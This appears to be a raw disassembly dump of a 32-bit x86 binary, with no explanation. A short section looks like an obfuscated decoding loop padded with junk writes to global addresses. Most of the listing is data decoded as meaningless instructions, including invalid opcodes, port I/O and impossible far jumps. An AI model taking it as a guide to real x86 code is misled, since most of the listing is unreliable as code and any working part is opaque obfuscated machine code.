  414086:	xor    BYTE PTR [ebp+0x550822c4],dl
  41408c:	dec    ebx
  41408d:	cwde   
  41408e:	call   0x4578:0xf83efcc9
  414095:	ins    BYTE PTR es:[edi],dx
  414096:	lds    esp,FWORD PTR [ebx+0x1f]
  414099:	xchg   edx,eax
  41409a:	cmp    eax,0xf4f4cb62
  41409f:	mov    ds:0x59a4cc3a,al
  4140a4:	int    0x1d
  4140a6:	xchg   ecx,eax
  4140a7:	jo     0x4140aa
  4140a9:	add    dh,ch
  4140ab:	dec    ebx
  4140ac:	and    BYTE PTR [eax+eiz*2+0x19],bh
  4140b0:	ja     0x414108
  4140b2:	in     al,dx
  4140b3:	fld    TBYTE PTR [esi-0xb]
  4140b6:	enter  0x4fed,0x8a
  4140ba:	jp     0x41404c
  4140bc:	cmp    ebp,DWORD PTR [edi+eiz*1-0x26152873]
  4140c3:	dec    eax
  4140c4:	pop    edx
  4140c5:	ror    BYTE PTR [ecx+0x4],cl
  4140c8:	pop    es
  4140c9:	in     eax,dx
  4140ca:	call   0xc54e8587
  4140cf:	inc    edi
  4140d0:	jbe    0x4140c0
  4140d2:	out    dx,eax
  4140d3:	push   esi
  4140d4:	mov    eax,0x75108af
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1-0x1795c7a7],dl
  41419c:	inc    eax
  41419d:	or     esp,esp
  41419f:	xchg   ebp,eax
  4141a0:	push   0x60e78382
  4141a5:	add    DWORD PTR [ebx-0x2810b8c8],0xffffffac
  4141ac:	sbb    DWORD PTR [ebp+esi*8+0x36],eax
  4141b0:	in     eax,dx
  4141b1:	sub    eax,0x1438b36
  4141b6:	cmc    
  4141b7:	(bad)  
  4141b8:	fldl2t 
  4141ba:	mov    esp,0x22b9d104
  4141bf:	scas   eax,DWORD PTR es:[edi]
  4141c0:	mov    ebp,0x56e5060f
  4141c5:	or     edi,0x43
  4141c8:	xchg   bx,ax
  4141ca:	xlat   BYTE PTR ds:[ebx]
  4141cb:	jbe    0x4141e6
  4141cd:	fild   WORD PTR [esi]
  4141cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141d0:	loopne 0x414185
  4141d2:	clc    
  4141d3:	mov    ds:0xa7a5ecb2,al
  4141d8:	pop    esi
  4141d9:	or     edi,DWORD PTR [esp+eax*2]
  4141dc:	jne    0x4141eb
  4141de:	sar    cl,1
  4141e0:	pop    eax
  4141e1:	retf   0x75a5
  4141e4:	xchg   dl,bl
  4141e6:	jnp    0x414202
  4141e8:	mov    edx,0xa1ed5e22
  4141ed:	ja     0x414267
  4141ef:	out    dx,al
  4141f0:	xor    BYTE PTR [ebx+eax*8-0x32a29535],bh
  4141f7:	dec    edx
  4141f8:	dec    ebx
  4141f9:	(bad)  
  4141fa:	shl    BYTE PTR [esi-0x1dc2c2bc],cl
  414200:	fistp  WORD PTR es:[esi+0x33119939]
  414207:	jmp    0x7646ad56
  41420c:	adc    DWORD PTR [ecx-0xd8c4c39],edi
  414212:	cmp    BYTE PTR [edx],bh
  414214:	ins    DWORD PTR es:[edi],dx
  414215:	mov    bl,0xc2
  414217:	inc    ebp
  414218:	sub    al,0xb7
  41421a:	dec    edi
  41421b:	(bad)  
  41421c:	fwait
  41421d:	in     al,dx
  41421e:	mov    cl,0x94
  414220:	aam    0x7d
  414222:	adc    DWORD PTR [eax+0x6f],ebx
  414225:	jg     0x4141f4
  414227:	bound  edi,QWORD PTR [ebx]
  414229:	jbe    0x41425f
  41422b:	mov    esi,0x81655505
  414230:	loope  0x414231
  414232:	ja     0x4141dd
  414234:	fnsave [ebx-0x2ace2eee]
  41423a:	jnp    0x414297
  41423c:	not    BYTE PTR [ebx]
  41423e:	inc    ecx
  41423f:	or     al,0xad
  414241:	ret    0x75e5
  414244:	and    ebx,ecx
  414246:	je     0x414233
  414248:	in     al,dx
  414249:	mul    DWORD PTR [edx]
  41424b:	push   esp
  41424c:	or     ebp,DWORD PTR [esi]
  41424e:	sti    
  41424f:	or     al,BYTE PTR ds:0x1ef5fc73
  414255:	test   esi,ebp
  414257:	sbb    esi,esp
  414259:	push   0x353f68d4
  41425e:	(bad)  
  41425f:	repnz sub al,0x14
  414262:	int    0x8
  414264:	xor    BYTE PTR [ebx-0x46b98313],ah
  41426a:	cmp    dh,dh
  41426c:	in     al,0x5b
  41426e:	jle    0x41420b
  414270:	fcmovne st,st(1)
  414272:	mov    ah,bl
  414274:	jp     0x414254
  414276:	jns    0x4142e3
  414278:	mov    bh,0xe5
  41427a:	bound  edi,QWORD PTR [eax]
  41427c:	adc    dl,al
  41427e:	cmp    BYTE PTR [ebp+0x7c],0x7e
  414282:	(bad)  
  414283:	adc    DWORD PTR [eax+0x417a44dc],ebp
  414289:	mov    ebp,DWORD PTR [ebx]
  41428b:	inc    ecx
  41428c:	in     eax,0xf0
  41428e:	add    eax,0xb8987ecc
  414293:	xor    edx,ebp
  414295:	dec    edi
  414296:	in     eax,0xbd
  414298:	rcr    DWORD PTR [ecx+0xf],1
  41429b:	fsubp  st(1),st
  41429d:	dec    esi
  41429e:	jbe    0x4142aa
  4142a0:	inc    ecx
  4142a1:	ja     0x4142d3
  4142a3:	fstp   TBYTE PTR [eax+0x4]
  4142a6:	cmp    DWORD PTR [eax],edi
  4142a8:	rep ins DWORD PTR es:[edi],dx
  4142aa:	lods   eax,DWORD PTR ds:[esi]
  4142ab:	clc    
  4142ac:	or     BYTE PTR [ebx],bl
  4142ae:	neg    DWORD PTR [ecx+0x79]
  4142b1:	pop    ds
  4142b2:	add    ebx,ebx
  4142b4:	sub    dl,BYTE PTR [edx-0x4bc25e36]
  4142ba:	sub    ebp,DWORD PTR [ecx+0x61c36546]
  4142c0:	mov    gs,WORD PTR [edi-0x5a744463]
  4142c6:	pop    ss
  4142c7:	adc    DWORD PTR [ebx-0x59],edx
  4142ca:	out    dx,al
  4142cb:	sub    al,0xa7
  4142cd:	mov    al,0xb5
  4142cf:	add    BYTE PTR [ebp-0x35],0xaf
  4142d3:	mov    bl,0x38
  4142d5:	and    BYTE PTR [esi-0x34fc071e],dh
  4142db:	jns    0x414294
  4142dd:	aaa    
  4142de:	(bad)  
  4142e0:	test   eax,0xda40dea2
  4142e5:	cli    
  4142e6:	aas    
  4142e7:	sbb    ch,BYTE PTR [esi+0x9f4bfba]
  4142ed:	and    ah,BYTE PTR [esi]
  4142ef:	cmp    BYTE PTR [eax+0x5697c4c9],ch
  4142f5:	fwait
  4142f6:	push   0x7a2086d
  4142fb:	push   es
  4142fc:	(bad)  
  4142fd:	dec    esi
  4142fe:	loop   0x414282
  414300:	aaa    
  414301:	inc    ebp
  414302:	jo     0x41433d
  414304:	push   ss
  414305:	mov    esi,0x9a3bd84a
  41430a:	and    eax,0x645336ab
  41430f:	xchg   ecx,eax
  414310:	ret    
  414311:	out    0x82,al
  414313:	adc    eax,0x6e208de
  414318:	push   cs
  414319:	sti    
  41431a:	push   ecx
  41431b:	mov    ch,BYTE PTR [esi+ebx*1-0x29]
  41431f:	push   ds
  414320:	inc    edx
  414321:	mov    ch,0x3a
  414323:	sahf   
  414324:	mov    ebp,0x686818d6
  414329:	xchg   esp,eax
  41432a:	push   0xffffffd7
  41432c:	mov    esp,0x64e47ed1
  414331:	mov    ch,0xc1
  414333:	stos   BYTE PTR es:[edi],al
  414334:	int3   
  414335:	mov    WORD PTR [ecx+0x58a698be],fs
  41433b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41433c:	and    esi,DWORD PTR [edi-0x1]
  41433f:	out    dx,al
  414340:	punpckhwd mm4,QWORD PTR [esi-0x5b]
  414344:	pop    ss
  414345:	lods   al,BYTE PTR ds:[esi]
  414346:	dec    esi
  414347:	out    dx,al
  414348:	dec    ebp
  414349:	xor    eax,0xae863366
  41434e:	push   esi
  41434f:	sahf   
  414350:	and    BYTE PTR [eax],dh
  414352:	imul   edi,DWORD PTR [ebx+0x38864c09],0x6f472b14
  41435c:	pop    esp
  41435d:	xor    al,0xd2
  41435f:	ins    BYTE PTR es:[edi],dx
  414360:	mov    ds:0x1486d827,eax
  414365:	adc    bh,BYTE PTR [esi+eax*1]
  414368:	mov    ch,0x98
  41436a:	cwde   
  41436b:	dec    ecx
  41436c:	ds push esp
  41436e:	fcom   st(3)
  414370:	rol    DWORD PTR [ebp+0x36],1
  414373:	cmc    
  414374:	outs   dx,DWORD PTR ds:[esi]
  414375:	in     al,0x78
  414377:	call   ebp
  414379:	jnp    0x414390
  41437b:	mov    cl,dh
  41437d:	or     ebp,eax
  41437f:	cmp    BYTE PTR [edx+0x48],dl
  414382:	sub    bl,ah
  414384:	out    0xa4,al
  414386:	adc    eax,0xcb517f58
  41438b:	je     0x414339
  41438d:	pop    ebp
  41438e:	lock inc esp
  414390:	mov    dl,0x8a
  414392:	cmp    cl,BYTE PTR [eax-0x355fb3a3]
  414398:	mov    edi,0x620bedbf
  41439d:	call   0xc5c7b73b
  4143a2:	xor    eax,0xbce48eb7
  4143a7:	or     al,0xda
  4143a9:	pop    es
  4143aa:	and    DWORD PTR [eax+0x5d991eb7],esp
  4143b0:	jmp    0x98b5:0x9594656f
  4143b7:	shr    BYTE PTR [edx-0x649a00df],1
  4143bd:	push   esi
  4143be:	xchg   ecx,eax
  4143bf:	jns    0x414387
  4143c1:	shr    edx,cl
  4143c3:	pop    edx
  4143c4:	ins    BYTE PTR es:[edi],dx
  4143c5:	push   ecx
  4143c6:	adc    al,al
  4143c8:	lea    esi,[eax]
  4143ca:	mov    eax,ds:0x28001fea
  4143cf:	mov    eax,0xbecc479a
  4143d4:	in     al,dx
  4143d5:	fsubr  QWORD PTR [ebp+0x6fc2cc29]
  4143db:	pop    eax
  4143dc:	inc    ebx
  4143dd:	out    0xf1,eax
  4143df:	sbb    eax,0xe49ae802
  4143e4:	cdq    
  4143e5:	les    eax,FWORD PTR [edi]
  4143e7:	ds xchg edi,eax
  4143e9:	cmp    edi,ecx
  4143eb:	out    dx,eax
  4143ec:	add    BYTE PTR [edx-0xc],0x86
  4143f0:	adc    DWORD PTR [ebx+0x53],0xd5a67f06
  4143f7:	xor    eax,0xb0d67bb6
  4143fc:	dec    ebp
  4143fd:	sub    ah,BYTE PTR [edi]
  4143ff:	xor    DWORD PTR [esi-0x38],esi
  414402:	loopne 0x4143ea
  414404:	dec    ebx
  414405:	sub    ebx,DWORD PTR [ecx+0x60]
  414408:	mov    ecx,DWORD PTR [ebx]
  41440a:	sub    eax,0xab7311f5
  41440f:	or     al,0xd6
  414411:	cdq    
  414412:	mov    ebx,0xb149f8f4
  414417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414418:	mov    DWORD PTR [edi-0x65d6dc3e],ecx
  41441e:	mov    edi,0x8cd7d447
  414423:	adc    DWORD PTR [ebx],edi
  414425:	pop    edi
  414426:	fdivr  QWORD PTR [ebx-0x1]
  414429:	cs xor esi,esp
  41442c:	retf   0xbd84
  41442f:	hlt    
  414430:	test   DWORD PTR [edi-0x44034f00],ecx
  414436:	jae    0x414432
  414438:	xor    DWORD PTR [ebx],0x345564d0
  41443e:	push   0xffffffe5
  414440:	(bad)  [edx]
  414442:	fldcw  WORD PTR [edx+0x5c154b81]
  414448:	jne    0x4144c1
  41444a:	retf   
  41444b:	xchg   ebp,eax
  41444c:	cmp    eax,0xd5907244
  414451:	add    DWORD PTR [ecx-0x6dbc16db],edi
  414457:	add    eax,0x16c19ef0
  41445c:	mov    gs,WORD PTR [esi-0xd9d7aa4]
  414462:	test   al,0xd3
  414464:	dec    ebp
  414465:	xchg   BYTE PTR [ebp+0x17720b95],ch
  41446b:	xchg   DWORD PTR [edi+0x174ac222],edi
  414471:	inc    edx
  414472:	lds    eax,FWORD PTR [edi+0x4009de64]
  414478:	stos   BYTE PTR es:[edi],al
  414479:	sbb    al,BYTE PTR [esi+0x78ea38c]
  41447f:	ins    BYTE PTR es:[edi],dx
  414480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414481:	ret    
  414482:	pop    ds
  414483:	xlat   BYTE PTR ds:[ebx]
  414484:	jecxz  0x4144f7
  414486:	mov    edx,0xbf7e2351
  41448b:	out    0x89,al
  41448d:	mov    eax,ds:0xd1c5e11b
  414492:	dec    ebx
  414493:	pusha  
  414494:	dec    edx
  414495:	sbb    al,0xbf
  414497:	hlt    
  414498:	push   esi
  414499:	sar    BYTE PTR [esi],0x77
  41449c:	add    BYTE PTR [ebx+0x45b6449d],ch
  4144a2:	cwde   
  4144a3:	retf   0x57a3
  4144a6:	mov    dh,0x90
  4144a8:	inc    edi
  4144a9:	in     al,0x46
  4144ab:	dec    esi
  4144ac:	pop    edx
  4144ad:	or     DWORD PTR [edx],ebx
  4144af:	in     al,dx
  4144b0:	jnp    0x4144c3
  4144b2:	dec    ah
  4144b4:	pusha  
  4144b5:	clc    
  4144b6:	pop    eax
  4144b7:	sbb    eax,0x3c27e1c3
  4144bc:	mov    dh,0x76
  4144be:	ins    BYTE PTR es:[edi],dx
  4144bf:	jl     0x4144f1
  4144c1:	cli    
  4144c2:	dec    edi
  4144c3:	inc    ebp
  4144c4:	jmp    0xd378:0xfab8fe61
  4144cb:	dec    ebx
  4144cc:	xor    BYTE PTR [ecx+0x4c922128],cl
  4144d2:	inc    ebx
  4144d3:	pop    ss
  4144d4:	arpl   WORD PTR [esi-0x5890ed31],si
  4144da:	inc    esi
  4144db:	pushf  
  4144dc:	ds push es
  4144de:	aad    0x98
  4144e0:	cmp    DWORD PTR [ecx-0x4e2cd57c],ebp
  4144e6:	jmp    0xb771f69d
  4144eb:	xchg   esp,eax
  4144ec:	mov    bl,0x19
  4144ee:	push   ebx
  4144ef:	lea    ebp,[ecx]
  4144f1:	inc    edi
  4144f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144f3:	pop    ss
  4144f4:	cmp    eax,0xaecd881c
  4144f9:	ins    DWORD PTR es:[edi],dx
  4144fa:	pop    esp
  4144fb:	lock jmp 0x4144e9
  4144fe:	or     dh,cl
  414500:	pop    ebp
  414501:	rol    esp,0x40
  414504:	inc    ebx
  414505:	lds    edx,FWORD PTR [eax-0xb]
  414508:	pop    ss
  414509:	push   0x35
  41450b:	or     edi,edi
  41450d:	xchg   edi,eax
  41450e:	inc    eax
  41450f:	jmp    0x41457e
  414511:	jne    0x414548
  414513:	or     esp,ecx
  414515:	adc    al,BYTE PTR [edi-0x60]
  414518:	and    DWORD PTR ss:[edx+0x2a],edi
  41451c:	outs   dx,BYTE PTR ds:[esi]
  41451d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41451e:	sbb    edx,ebx
  414520:	dec    edi
  414521:	cli    
  414522:	arpl   WORD PTR ds:0x4d5dcc26,si
  414528:	mov    bl,0x60
  41452a:	call   0x3a0e50a
  41452f:	sub    DWORD PTR [eax],esp
  414531:	push   cs
  414532:	sub    ebp,DWORD PTR [esi+0x73]
  414535:	(bad)  
  414536:	pcmpgtd mm1,QWORD PTR [esi+0xa]
  41453a:	xlat   BYTE PTR ds:[ebx]
  41453b:	cdq    
  41453c:	mov    ah,0x1e
  41453e:	(bad)  
  41453f:	jmp    0xbe97:0xce8c6803
  414546:	or     ecx,DWORD PTR [edi]
  414548:	pushf  
  414549:	pop    esp
  41454a:	mov    eax,ds:0x6692c9fc
  41454f:	aad    0x26
  414551:	test   DWORD PTR [eax-0x9],0x99e56b42
  414558:	call   0xd6140293
  41455d:	(bad)  
  41455e:	iret   
  41455f:	add    BYTE PTR [esi+ecx*4],0x31
  414563:	mov    dh,0x1a
  414565:	jae    0x414584
  414567:	xchg   DWORD PTR [ebx-0x532ed47f],edi
  41456d:	dec    edx
  41456e:	or     esi,ecx
  414570:	cmp    eax,0x137cc1ea
  414575:	xor    DWORD PTR [eax+0x19f2aa09],esi
  41457b:	ss loopne 0x414530
  41457e:	ins    DWORD PTR es:[edi],dx
  41457f:	xor    eax,0x255f0da1
  414584:	cmp    BYTE PTR [ebp-0x1a],ch
  414587:	dec    ecx
  414588:	ins    BYTE PTR es:[edi],dx
  414589:	dec    edi
  41458a:	shl    BYTE PTR [ebx+0x50eeee36],cl
  414590:	fidivr DWORD PTR [ecx-0x7678e9c6]
  414596:	bound  eax,QWORD PTR [ebp+0x5779a6ea]
  41459c:	mov    ds:0xb7a44500,al
  4145a1:	mov    ?,WORD PTR [edx+0x2f60b6ed]
  4145a7:	mov    bh,0xe7
  4145a9:	pop    ss
  4145aa:	std    
  4145ab:	into   
  4145ac:	cwde   
  4145ad:	and    DWORD PTR [ebx+eax*8],edx
  4145b0:	mov    eax,ds:0xc8ea43ff
  4145b5:	pmullw mm3,mm5
  4145b8:	mov    ah,BYTE PTR [esi]
  4145ba:	xchg   BYTE PTR [eax+0x50],bl
  4145bd:	loopne 0x41461c
  4145bf:	sub    eax,0xb9e98661
  4145c4:	comiss xmm0,DWORD PTR [edx]
  4145c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145c8:	repnz dec esp
  4145ca:	addr16 nop
  4145cc:	scas   al,BYTE PTR es:[edi]
  4145cd:	xor    al,0x44
  4145cf:	cmp    DWORD PTR [ebp-0x7e],ebp
  4145d2:	dec    ebx
  4145d3:	mov    ds:0x2771b009,eax
  4145d8:	es push ebp
  4145da:	mov    cl,0xe4
  4145dc:	xchg   edx,eax
  4145dd:	shl    DWORD PTR [ebx-0x23274eba],cl
  4145e3:	mov    al,0x4c
  4145e5:	mov    ch,0xde
  4145e7:	inc    esp
  4145e8:	lea    eax,[ebx-0x20]
  4145eb:	(bad)  
  4145ec:	jnp    0x41462c
  4145ee:	add    BYTE PTR [ebx+ebx*8],ah
  4145f1:	rcr    BYTE PTR [edi+0x5c],1
  4145f4:	and    eax,DWORD PTR [esi]
  4145f6:	fdivr  DWORD PTR [esi-0x52]
  4145f9:	inc    eax
  4145fa:	ins    DWORD PTR es:[edi],dx
  4145fb:	aaa    
  4145fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fd:	in     al,dx
  4145fe:	shr    BYTE PTR [edx+0x7],cl
  414601:	mov    edx,0x28a9fa97
  414606:	(bad)  
  414607:	cmp    esi,DWORD PTR [ebx-0x1b2a82d3]
  41460d:	or     ah,BYTE PTR es:[edx]
  414610:	mov    ebp,0xb7fcc300
  414615:	dec    ebp
  414616:	inc    edx
  414617:	mov    cl,0x31
  414619:	out    0x55,eax
  41461b:	call   0xb6568066
  414620:	mov    ds:0x552b41ad,eax
  414625:	xchg   edx,eax
  414626:	sub    ebp,ebx
  414628:	jo     0x4146a4
  41462a:	dec    edx
  41462b:	inc    esp
  41462c:	sbb    bl,BYTE PTR [edi+0x28bf2e74]
  414632:	or     BYTE PTR [edi],0x88
  414635:	cmp    esp,edi
  414637:	test   eax,0x7e115259
  41463c:	pusha  
  41463d:	mov    esi,0x88ef6d27
  414642:	push   esp
  414643:	pushf  
  414644:	fstp   TBYTE PTR ds:0x88290fcf
  41464a:	or     esp,DWORD PTR [edx-0x4f]
  41464d:	xor    DWORD PTR [esi+0x10],ebp
  414650:	pop    ds
  414651:	inc    eax
  414652:	jecxz  0x414688
  414654:	xchg   DWORD PTR [ebp+0x72768a6e],ebp
  41465a:	(bad)  
  41465b:	or     ebx,ecx
  41465d:	(bad)  
  41465e:	inc    eax
  41465f:	mov    dl,0xf9
  414661:	add    al,0x4b
  414663:	(bad)  
  414664:	lods   al,BYTE PTR ds:[esi]
  414665:	outs   dx,DWORD PTR ds:[esi]
  414666:	mov    DWORD PTR [ecx],ecx
  414668:	neg    BYTE PTR [edx]
  41466a:	enter  0x8d97,0xe0
  41466e:	daa    
  41466f:	dec    eax
  414670:	fcmovnu st,st(6)
  414672:	mov    eax,0xe869583a
  414677:	nop
  414678:	pop    esi
  414679:	lahf   
  41467a:	xchg   ebp,eax
  41467b:	cmp    DWORD PTR [ecx+0x20b86b1c],eax
  414681:	fisub  WORD PTR [ebx]
  414683:	int    0x20
  414685:	call   0x939a:0xb6f194b6
  41468c:	cmp    cl,ch
  41468e:	jns    0x41465c
  414690:	mov    al,ds:0x8260f74
  414695:	sbb    eax,0xb8487f57
  41469a:	dec    ebx
  41469b:	dec    esp
  41469c:	in     eax,dx
  41469d:	arpl   WORD PTR [ebx],bx
  41469f:	jo     0x41462b
  4146a1:	in     al,0xff
  4146a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a4:	daa    
  4146a5:	lods   eax,DWORD PTR ds:[esi]
  4146a6:	inc    ebx
  4146a7:	retf   0x3790
  4146aa:	jno    0x414682
  4146ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146ad:	inc    ebp
  4146ae:	mov    ds:0x98ebeae6,al
  4146b3:	mov    ebx,0xdbf045df
  4146b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146b9:	lods   al,BYTE PTR ds:[esi]
  4146ba:	push   edx
  4146bb:	xlat   BYTE PTR ds:[ebx]
  4146bc:	ja     0x414718
  4146be:	or     eax,ebp
  4146c0:	es iret 
  4146c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146c3:	ins    DWORD PTR es:[edi],dx
  4146c4:	pop    esp
  4146c5:	shl    BYTE PTR [eax],1
  4146c7:	and    edx,DWORD PTR [edx*8+0x79047524]
  4146ce:	retf   
  4146cf:	iret   
  4146d0:	pop    edi
  4146d1:	mov    edx,ecx
  4146d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146d4:	and    ch,BYTE PTR [ebx-0xb]
  4146d7:	add    al,0xd0
  4146d9:	dec    ebx
  4146da:	stos   BYTE PTR es:[edi],al
  4146db:	arpl   WORD PTR [edi-0x7a],bp
  4146de:	pop    ss
  4146df:	add    eax,0x1781b081
  4146e4:	push   ebp
  4146e5:	fwait
  4146e6:	pop    ebp
  4146e7:	mov    ch,0xbb
  4146e9:	mul    DWORD PTR [esi+0x1367b852]
  4146ef:	dec    esp
  4146f0:	popf   
  4146f1:	cmc    
  4146f2:	cmp    ebp,DWORD PTR [edx]
  4146f4:	ja     0x4146dd
  4146f6:	inc    ecx
  4146f7:	push   cs
  4146f8:	lock dec ebx
  4146fa:	lods   eax,DWORD PTR ds:[esi]
  4146fb:	inc    eax
  4146fc:	xchg   ebx,eax
  4146fd:	cmc    
  4146fe:	fbld   TBYTE PTR [edi+0x4a]
  414701:	add    eax,0xefa757d2
  414706:	sbb    al,0x99
  414708:	dec    ecx
  414709:	loop   0x41476c
  41470b:	gs (bad) 
  41470d:	sbb    DWORD PTR [ecx],ebx
  41470f:	sub    eax,0x7c97cb25
  414714:	pusha  
  414715:	push   ss
  414716:	repnz (bad) 
  414718:	call   DWORD PTR [eax+ebp*2]
  41471b:	sbb    BYTE PTR [ebp+0x29db2aeb],bh
  414721:	add    DWORD PTR [esi-0x68f9dd11],esp
  414727:	stos   BYTE PTR es:[edi],al
  414728:	out    dx,eax
  414729:	int3   
  41472a:	cmp    eax,DWORD PTR [ecx]
  41472c:	or     BYTE PTR ds:0xd97f3b03,ah
  414732:	pop    edx
  414733:	outs   dx,DWORD PTR ds:[esi]
  414734:	aad    0xa
  414736:	and    edx,DWORD PTR [edi-0x32088428]
  41473c:	mov    ah,0x97
  41473e:	fcmovu st,st(2)
  414740:	sbb    BYTE PTR [ecx+0xf],ch
  414743:	adc    DWORD PTR [ebx],ecx
  414745:	into   
  414746:	add    BYTE PTR [esi+0x5148d709],ch
  41474c:	jbe    0x414781
  41474e:	out    dx,al
  41474f:	(bad)  
  414750:	and    BYTE PTR [eax],bl
  414752:	popf   
  414753:	cmp    BYTE PTR [ebp+0xa30312c],cl
  414759:	pop    ecx
  41475a:	js     0x414748
  41475c:	lahf   
  41475d:	in     eax,0xb8
  41475f:	dec    esp
  414760:	loopne 0x414780
  414762:	push   esi
  414763:	leave  
  414764:	fisub  DWORD PTR [edx+ecx*8-0x5ac6cf4f]
  41476b:	sbb    edi,esi
  41476d:	add    eax,0x652803c4
  414772:	rol    DWORD PTR [ecx-0x6d],1
  414775:	jns    0x4147e5
  414777:	call   0x490c:0xad33d84e
  41477e:	dec    DWORD PTR [edx+0x39924084]
  414784:	gs sub bl,ch
  414787:	sahf   
  414788:	aas    
  414789:	std    
  41478a:	pop    ebp
  41478b:	out    0x12,al
  41478d:	repz jno 0x4147cc
  414790:	test   DWORD PTR [eax],0xd5d21f63
  414796:	mov    esi,esi
  414798:	icebp  
  414799:	mov    eax,ds:0xdad2bddb
  41479e:	mov    bh,0x9e
  4147a0:	cmc    
  4147a1:	add    ch,al
  4147a3:	cmp    BYTE PTR [eax+0x1729e582],cl
  4147a9:	cdq    
  4147aa:	(bad)  [eax+edi*1+0x31]
  4147ae:	je     0x414789
  4147b0:	popa   
  4147b1:	fdivr  QWORD PTR [ecx-0x57]
  4147b4:	sbb    ebp,DWORD PTR [edi-0x18b6a6fa]
  4147ba:	sbb    al,0x5c
  4147bc:	not    esi
  4147be:	sbb    ecx,esi
  4147c0:	pop    esp
  4147c1:	push   0x97761af
  4147c6:	push   edx
  4147c7:	add    al,0x68
  4147c9:	stos   DWORD PTR es:[edi],eax
  4147ca:	push   ss
  4147cb:	mov    bl,0xce
  4147cd:	mov    ebx,0x89335f59
  4147d2:	scas   al,BYTE PTR es:[edi]
  4147d3:	inc    ebx
  4147d4:	cmp    esi,DWORD PTR [eax]
  4147d6:	popf   
  4147d7:	push   0x761eb0d5
  4147dc:	fist   WORD PTR [ebx-0x1]
  4147df:	fidiv  WORD PTR [esi]
  4147e1:	pop    edx
  4147e2:	jp     0x4147d5
  4147e4:	hlt    
  4147e5:	xlat   BYTE PTR ds:[ebx]
  4147e6:	imul   esp,DWORD PTR [edi],0x59
  4147e9:	xchg   bl,dh
  4147eb:	mov    bh,BYTE PTR [eax]
  4147ed:	fidivr WORD PTR [esi+0x7b]
  4147f0:	add    ch,BYTE PTR [ebx-0x4dbf58b3]
  4147f6:	push   ss
  4147f7:	(bad)  
  4147f8:	xchg   edx,eax
  4147f9:	daa    
  4147fa:	push   edx
  4147fb:	out    0x50,al
  4147fd:	das    
  4147fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147ff:	jbe    0x414857
  414801:	(bad)  
  414802:	stc    
  414803:	ins    BYTE PTR es:[edi],dx
  414804:	xchg   edx,eax
  414805:	js     0x414865
  414807:	push   eax
  414808:	xchg   ebx,eax
  414809:	scas   eax,DWORD PTR es:[edi]
  41480a:	in     al,0x2c
  41480c:	das    
  41480d:	and    esi,DWORD PTR [ecx-0x64]
  414810:	cmp    WORD PTR [eax-0x8d86fe0],si
  414817:	cmp    DWORD PTR [esi-0x46a0270f],0xffffff84
  41481e:	push   eax
  41481f:	test   BYTE PTR [edx+edi*1-0x40],ah
  414823:	xchg   dx,ax
  414825:	imul   esi,DWORD PTR [ebx+0x35b4c016],0xffffffe4
  41482c:	ds jne 0x4148a2
  41482f:	test   al,0x34
  414831:	es mov cl,0x95
  414834:	xlat   BYTE PTR ds:[ebx]
  414835:	sub    ebx,DWORD PTR [edx-0x26]
  414838:	xor    al,0xdc
  41483a:	or     ebp,DWORD PTR [ebx-0x4a]
  41483d:	jmp    0xbb163a3a
  414842:	jb     0x41488e
  414844:	xchg   bh,bl
  414846:	xor    ah,BYTE PTR [edi+eiz*4-0x27]
  41484a:	imul   esp,DWORD PTR [ecx],0xaacf279c
  414850:	xor    dl,dh
  414852:	out    dx,eax
  414853:	stc    
  414854:	in     al,0xfd
  414856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414857:	jmp    0xcc61:0xf99d0786
  41485e:	adc    DWORD PTR [ebp+0x2410de08],edx
  414864:	inc    ebp
  414865:	cmp    bl,BYTE PTR [edx-0x70667494]
  41486b:	sbb    DWORD PTR [eax+0x69],esi
  41486e:	push   edx
  41486f:	and    eax,0x6a
  414872:	stc    
  414873:	and    edx,DWORD PTR [edi+0x4b]
  414876:	popf   
  414877:	pop    ebx
  414878:	mov    cl,BYTE PTR [edi-0x46]
  41487b:	xlat   BYTE PTR ds:[ebx]
